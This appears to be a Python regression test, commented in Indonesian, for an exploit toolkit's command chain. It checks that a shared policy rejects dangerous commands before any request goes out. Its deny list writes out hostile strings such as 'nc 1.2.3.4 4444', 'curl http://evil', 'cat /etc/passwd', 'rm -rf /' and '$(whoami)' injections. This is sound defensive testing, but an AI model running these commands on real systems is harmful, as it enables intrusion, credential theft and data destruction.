"""Tes regresi R2-01 jalur API — `chain.Chain()` menolak perintah berbahaya.

Temuan (round 2 lanjutan, ditemukan saat memverifikasi cakupan audit):
`lib/chain.py` hanya memeriksa PANJANG perintah (`MAX_CMD = 14`). Isinya tidak
diperiksa sama sekali — bahkan pesan errornya mencontohkan `sh</out/c`.
Akibatnya pagar `exploit_runner.validate_command()` bisa dilewati sepenuhnya
lewat jalur API:

    from lib import chain
    t = chain.Target("http://target/", ...)
    chain.Chain(t, "sh</out/c")      # LOLOS, tanpa satu pun pemeriksaan

Ini kelas bug yang sama dengan R2-01, di pintu yang berbeda (Chain dipakai
langsung oleh `shell/upshell_live.py` dan `shell/upshell_lab.py`).

Perbaikan: `cmd_policy.check_command_shape()` dipanggil di
`Chain.__init__()` sebelum `self.cmd` dibentuk. Aturannya satu sumber dengan
`exploit_runner` (batas byte, token terlarang, kanal bukti), tanpa siklus
impor.
"""

import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from lib import chain  # noqa: E402
from lib import cmd_policy  # noqa: E402
from lib import exploit_runner  # noqa: E402


def _target():
    return chain.Target("http://127.0.0.1:9/", timeout=1, verbose=False,
                        verify_tls=False)


class TestChainRejectsUnsafeCommand(unittest.TestCase):
    """Vektor yang harus ditolak SEBELUM satu request apa pun dikirim."""

    DITOLAK = [
        "sh</out/c",            # contoh literal di pesan error lama
        "sh -c id",
        "id;id",
        "id|id",
        "id&&id",
        "id||id",
        "id$(whoami)",
        "id`whoami`",
        "rm -rf /",
        "rm v",
        "cat /etc/passwd",
        "nc 1.2.3.4 4444",
        "curl http://evil",
        "wget http://evil",
        "chmod 777 x",
        "python -c 1",
        "base64 /etc/passwd",
        "id\nwhoami",
        "id\rwhoami",
    ]

    def test_perintah_berbahaya_ditolak(self):
        t = _target()
        for cmd in self.DITOLAK:
            with self.subTest(cmd=cmd):
                with self.assertRaises(ValueError) as ctx:
                    chain.Chain(t, cmd, verbose=False)
                msg = str(ctx.exception)
                self.assertIn("ditolak", msg)
                # Pesan menyebut SEBAB, bukan sekadar "invalid".
                self.assertTrue(
                    "byte" in msg or "berbahaya" in msg or "kosong" in msg, msg)

    def test_panjang_berlebih_ditolak(self):
        t = _target()
        # `uname --all` (11 byte) LOLOS pemeriksaan bentuk — dan itu benar:
        # pemeriksaan bentuk tidak memutuskan whitelist/skema argumen. Yang
        # diuji di sini murni batas byte carrier.
        for cmd in ("x" * 15, "id" + " " * 13, "a" * 20):
            with self.subTest(cmd=cmd):
                self.assertGreater(len(cmd.encode()), cmd_policy.MAX_CMD_BYTES)
                with self.assertRaises(ValueError):
                    chain.Chain(t, cmd, verbose=False)

    def test_kosong_ditolak(self):
        t = _target()
        for cmd in ("", "   ", "\t", None):
            with self.subTest(cmd=cmd):
                with self.assertRaises(ValueError):
                    chain.Chain(t, cmd, verbose=False)  # type: ignore[arg-type]


class TestChainAllowsLegitimateCommand(unittest.TestCase):
    """Kontrol positif: jalur sah (termasuk kanal bukti) tidak ikut diblokir."""

    def test_perintah_identitas_dan_proof(self):
        t = _target()
        for cmd in ("id", "whoami", "uname -a", "id>/out/p1",
                    "whoami>/out/p1"):
            with self.subTest(cmd=cmd):
                ex = chain.Chain(t, cmd, verbose=False)
                self.assertEqual(ex.cmd, cmd.encode())

    def test_perintah_tetap_modul_upshell(self):
        """Bentuk yang dibangun `upshell_live.py` harus tetap bisa dipakai."""
        t = _target()
        for cmd in ("rm v", "rm g"):
            # `rm v` dilarang di jalur PROOF (exploit_runner) tetapi ini jalur
            # carrier webshell... yang JUGA harus ditolak oleh kebijakan ini,
            # karena bentuknya chaining-ish (`rm `). Jadi kita tegaskan
            # perilakunya: ditolak di Chain, dan `upshell_live` memakai
            # validate_carrier_cmd() sendiri (RR-2) sebelum sampai ke sini.
            with self.subTest(cmd=cmd):
                with self.assertRaises(ValueError):
                    chain.Chain(t, cmd, verbose=False)


class TestSingleSourceOfTruth(unittest.TestCase):
    """Aturan bentuk tidak boleh diduplikasi dengan nilai berbeda."""

    def test_konstanta_sama_dengan_exploit_runner(self):
        self.assertEqual(cmd_policy.MAX_CMD_BYTES,
                         exploit_runner.MAX_CMD_BYTES)
        self.assertEqual(tuple(cmd_policy.FORBIDDEN_CMD_TOKENS),
                         tuple(exploit_runner.FORBIDDEN_CMD_TOKENS))
        self.assertEqual(cmd_policy.PROOF_DIR, exploit_runner.PROOF_DIR)
        self.assertEqual(tuple(cmd_policy.PROOF_BASES),
                         tuple(exploit_runner.PROOF_BASES))

    def test_exploit_runner_tidak_mendefinisikan_ulang(self):
        """`FORBIDDEN_CMD_TOKENS` harus ALIAS, bukan literal baru."""
        import inspect
        src = inspect.getsource(exploit_runner)
        self.assertIn("FORBIDDEN_CMD_TOKENS = cmd_policy.FORBIDDEN_CMD_TOKENS",
                      src,
                      "aturan bentuk diduplikasi — dua salinan bisa menyimpang")

    def test_chain_memanggil_check_command_shape(self):
        import inspect
        src = inspect.getsource(chain.Chain.__init__)
        self.assertIn("check_command_shape", src,
                      "Chain tidak memakai kebijakan bentuk bersama")


class TestShapeCheckerContract(unittest.TestCase):
    def test_shape_checker_tidak_memeriksa_whitelist(self):
        """check_command_shape hanya bentuk; whitelist milik pemanggil.

        `cat` (bukan whitelist proof) harus LOLOS pemeriksaan bentuk — kalau
        tidak, aturan whitelist ikut bocor ke chain dan pesan errornya jadi
        menyesatkan.
        """
        self.assertEqual(cmd_policy.check_command_shape("cat"), "")

    def test_proof_redirect_bentuk_saja(self):
        self.assertTrue(cmd_policy.is_proof_redirect("ls>/out/p1"))
        self.assertFalse(cmd_policy.is_identity_proof("ls>/out/p1"))
        self.assertTrue(cmd_policy.is_identity_proof("id>/out/p1"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
